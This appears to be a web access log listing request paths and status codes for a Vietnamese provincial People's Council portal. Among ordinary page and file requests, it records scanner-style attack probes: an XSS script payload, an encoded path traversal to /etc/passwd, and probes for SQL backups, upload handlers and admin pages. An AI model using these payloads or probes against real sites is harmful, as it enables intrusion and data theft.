/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/AttachFiles/AttachFiles/31.+NQ+sua+doi+bo+sung+NQ+11+_+62+HDND131220180426.pdf,404
/audio/27712.mp3,404
/server/,404
/_layouts/cui.js,200
/portal/pages/Ban-Van-hoa-Xa-hoi.aspx,200
/hoidongnhandan/1231/29459/39407/Gioi-thieu/AttachFiles/tai-lieu-detail.aspx,404
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/cgi-bin/nightled.cgi,404
/portal/_pageLayouts/two-cols-left/layout.css,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-regular.woff2,200
"/AttachFiles/38.+BC+phong,+chong+tham+nhung+6+thang+dau+nam+2019100620201049.pdf",200
/portal/Photos/2023-05-12/390c0af803f0778d20230511_152751.jpg,200
/audio/27981.mp3,404
/portal/LinkImage/2c8d9318ee102ddunnamed.jpg,200
/apple-touch-icon.png,404
/portal/Pages/default.aspx/test.ashx,200
"/redirect.php/""><script>alert(document.domain)</script>",400
/GallerySite/filesrc/fotoilan/388/middle/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,400
"/AttachFiles/39.+BC+k.qua+thuc+hanh+tiet+kiem,+CLP+6+thang+dau+nam+2019100620201050.pdf",200
/portal/pages/photos,302
/Admin/Access/Setup/Default.aspx,404
/cgi-bin/awstats/awredir.pl,415
/chosen.php,404
/portal/Pages/2023-4-19/Dong-chi-Pho-Bi-thu-Thuong-truc-Tinh-uy-tiep-xuc-c61hgxb.aspx,200
/AttachFiles/van-ban-kinh-te.aspx,403
/portal/Pages/default.aspx/api/uploadfile.ashx,200
/admin/ajax/pages.php,404
/img/layouts/sidebar-toggler.png,200
/assets/backend/elfinder/elfinder-cke.html,404
/api/v2/cmdb/system/admin,404
/portal/Pages/default.aspx/ceshi.ashx,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-italic.woff2,200
"/AttachFiles/33.+BC+k.qua+t.hien+k.nghi+cua+dai+bieu+HDND+tinh+tai+ky+6,7100620201047.pdf",200
/portal/Pages/Gioi-thieu-chung.aspx,200
/portal/Photos/2023-10/fcfedec2a4cd61ddqh1.png,200
/db_backup.sql,404
/portal/pages/Hoat-dong-cua-HDND-tinh.aspx,200
/hoidongnhandan/1231/29459/39475/hdnd-qua-cac-thoi-ky/href='/AttachFiles/tai-lieu.aspx,404
/index.asp,415
/view-doccument-13-BC-HDND-58.html,404
/portal/Photos/2024-03/59a4b336ca88b8dda1_20240307123759.jpg,200
/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/logfile,404
/Style+Library/en-US/Themable/Core+Styles/controls.css,404
/portal/_res/img/bg-patern-footer.png,200
/portal/Pages/2023-10-23/NANG-CAO-CHAT-LUONG-CONG-TAC-THAM-MUU-GIUP-VIEC-VAsivciz.aspx,200
/portal/Photos/2024-02/_t/6b6a7ce30fd9c71d1_20240220112335_jpg.jpg,200
/hoidongnhandan/1231/29459/40932/van-ban-tra-loi-y-kien---kien-nghi-cu-tri/tai-lieu-detail.aspx,404
/portal/LinkImage/1d81b253d19d58adDA7.jpg,200
/wizard/initialise.php,404
/portal/Photos/2023-01-19/99989deda392571dIMG_2384.jpg,200
/cgi-bin/popen.cgi,404
"/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/AttachFiles/5.+NQ+ve+quyet+dinh+chu+truong+dau+tu+du+an+xay+dung+KDC+tap+trung+phia+Bac+thon+An+Loc+Thuong,+xa+Yen+Hong,+huyen+Y+Yen260420210411.pdf",400
/WebResource.axd,200
/cgi-bin/slogin/login.py,404
/api/v1/method.callAnon/sendForgotPasswordEmail,404
/portal/Pages/2023-5-12/Dai-hoi-Cong-doan-Van-phong-Doan-DBQH-va-HDND-tinhsm6bs9.aspx,200
/horde/admin/user.php,404
/portal/Pages/2024-3-27/Hoi-nghi-toan-quoc-tong-ket-cong-tac-HDND-cac-tinht9cojv.aspx,200
/configWizard/keyUpload.jsp,404
/_layouts/1033/init.js,200
/client/index.php,404
/AttachFiles/25.+QD+muc+ho+tro+kp+tu+NSNN+va+cac+khoan+dong+gop+dv+nguoi+tu+nguyen+cai+nghien+MT020720190208.pdf,404
/_LAYOUTS/TanDan/UploadControler.ashx,200
/portal/Photos/2023-04-21/8901b0cad1ca9ced3.jpg,200
/audio/28053.mp3,404
/hoidongnhandan/1231/29461/39412/95501/Tin-tuc---Hoat-dong/Hoi-nghi-lien-tich-thong-nhat-noi-dung-ky-hop-thu-nam-Hoi-dong-nhan-dan-tinh-khoa-XVIII.aspx,404
/admin/elfinder/elfinder-cke.html,404
/network_test.php,404
/audio/28081.mp3,404
/portal/Pages/2023-7-11/Ban-Van-hoa--Xa-hoi-HDND-tinh-tham-tra-truoc-ky-hor8ud8t.aspx,200
/api/2eGZrlspR5oJDSTECVv0dW1ZfMt,404
/portal/Pages/default.aspx/Admin/Uploadify,200
/portal/Photos/2023-12/fc3b9dee9dc9cf1d10+(2).jpg,200
/portal/Pages/default.aspx/tools/Uploadhandler.ashx,200
/audio/27461.mp3,404
/AttachFiles/CV+số+322+của+UBTVQH14+về+tham+khảo+lấy+fieu+tin+nhiệm+(1)181020180315150620200231.pdf,200
/hoidongnhandan/1231/29459/42083/Hoi-dong-nhan-dan-huyen-Hai-Hau/,404
/AttachFiles/nghi-quyet.aspx,403
/portal/Photos/2023-01/dd1af49d044c8efdIMG_2384.jpg,200
/elFinder/php/connector.minimal.php,404
/portal/Pages/Cac-ban-HDND-tinh.aspx,200
/portal/Pages/2023-9-2/Tuyen-ngon-doc-lap--ket-tinh-nhung-gia-tri-van-hoap3zcft.aspx,200
/2eGZrcYCuUDCgqedlgws7Nx4MGA.jsp,404
"/AttachFiles/38.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hanh+tiet+kiem,+chong+lang+phi+nam+2020031220200927.pdf",304
/AttachFiles/21.+QH+chung+rang+dong280620180909.pdf,304
/linuxki/experimental/vis/kivis.php,404
/portal/Pages/default.aspx/Manage/Uploadhandler,200
/backup-mysql.sql,404
/portal/Pages/default.aspx/api/upfile.ashx,200
/portal/Pages/default.aspx/Admin/Uploadhandler,200
/portal/LinkImage/a4476add1fdc5eadChinhPhu-2.jpg,200
/portal/_res/img/tangtuongphan.png,200
/v1/2eGZrftKq4IatbQGC7INQDq1jpg.php,404
/audio/27934.mp3,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadhandler.ashx,200
/AttachFiles/hd+tổ+chức+kỳ+họp+thường+lệ+hĐnd+huyện030620180639.doc,200
/js/form/layouts.custom.js,200
/_layouts/tandan.portal/weather/img/48/02d.png,200
/index_sso.php,404
/_layouts/tandan.portal/weather/img/128/10n.png,200
/js/form/jquery.ui.min.js,200
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/tai-lieu-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/admin/uploads.php,404
/portal/Photos/2024-01/_t/91e81f2d5c3ea6fd1_20240130182954_png.jpg,200
/van-ban-van-hoa.aspx,404
/hoidongnhandan/1231/29459/44416/Ky-hop-thu-nam/AttachFiles/nghi-quyet.aspx,404
/audio/27740.mp3,404
/portal/Pages/2022-10-28/Giam-sat-viec-thuc-hien-cac-chuong-trinh-tin-dung-73wamu.aspx,200
/hoidongnhandan/1231/29461/39414/79587/Ban-Van-hoa---Xa-hoi-HDND-tinh/Ban-Van-hoa---Xa-hoi-HDND-tinh--tham-tra-De-an-dat--doi-ten-duong--pho-va-cong-trinh-cong-cong-TP-Nam-Dinh-Trinh-Ky-hop-thu-hai---HDND-tinh-khoa-XVIII--nhiem-ky-2016---2021.aspx,403
/js/layouts/app.js,200
/portal/Photos/2024-01/f960ed21dd670a7d1_20240119144606.png,200
/cgi-bin/masterCGI,404
/mysql_dump.sql,404
/dfsms/add-category.php,404
/portal/_res/img/bg-shadow.png,200
/portal/_themes/Portal_red/img/tags.png,200
/Style+Library/en-US/Core+Styles/page-layouts-21.css,404
/AttachFiles/qĐ+thành+lập+Đoàn+giam+sat+chuyen+de+ve+khcn1030620180631.doc,200
"/AttachFiles/18.+BC+k.qua+cong+tac+phong,+chong+toi+pham+va+vi+pham+PL+2019100620201110.pdf",304
/portal/pages/photos/default.aspx,200
/audio/27939.mp3,404
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/nghi-quyet-detail.aspx,404
/backups.sql,404
/portal/Photos/2023-12/bf654a61cd7d5dcd960_20231222221109.png,200
/portal/Pages/2024-3-14/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phat9euq2a.aspx,200
/portal/js/jquery.tandan.bar-chart.js,200
/mims/updatecustomer.php,404
/portal/Pages/2022-6-25/Doan-giam-sat-cua-Thuong-truc-HDND-tinh-hop-thong-9mu35z.aspx,200
/api/v1/login/oauth2/auth,404
/_layouts/spgridview.js,200
/export/mysql.sql,404
/portal/_res_bak/img/print.png,404
/audio/27559.mp3,404
/portal/Pages/default.aspx/api/fileupload.ashx,200
/portal/Pages/2021-9-30/Hoi-nghi-tong-ket-va-ky-ket-Quy-che-phoi-hop-cong-jbt3au.aspx,200
/SamlResponseServlet,404
/AttachFiles/05-NQ-HĐND100620201149.pdf,304
"/AttachFiles/NQ+54+phu+cap+Thon+doi+truong,+muc+tro+cap+ngay+cong+lao+dong+doi+voi+dan+quan+khi+thuc+hien+nhiem+vu151220200251.pdf",200
/AdminTools/querybuilder/logon,404
/portal/Pages/default.aspx/files.ashx,200
/portal/_themes/Portal_red/img/ic-search.png,200
/config/getuser,404
/portal/Pages/2023-12-10/feqb9q.aspx,200
/RestAPI/Connection,404
/flash/addcrypted2,404
/tai-lieu-detail.aspx,404
/js/form/jscrollpane.min.js,200
/wp-content/themes/wpclassic/inc/index.php,404
/portal/Photos/2023-05/_t/80b42ddfe5d2c0d11e2130191db4f8516ca_jpg.jpg,200
/portal/Photos/2024-03/_t/59a4b336ca88b8dda1_20240307123759_jpg.jpg,200
/portal/Photos/2023-06/6256a234de4e5c0duntitled-2_20230619143248.jpg,200
/portal/_res/img/ic-media-item.svg,200
/help/english/index.html,404
/portal/Photos/2023-09/73eac09334699e0da1_20230906182448.jpg,200
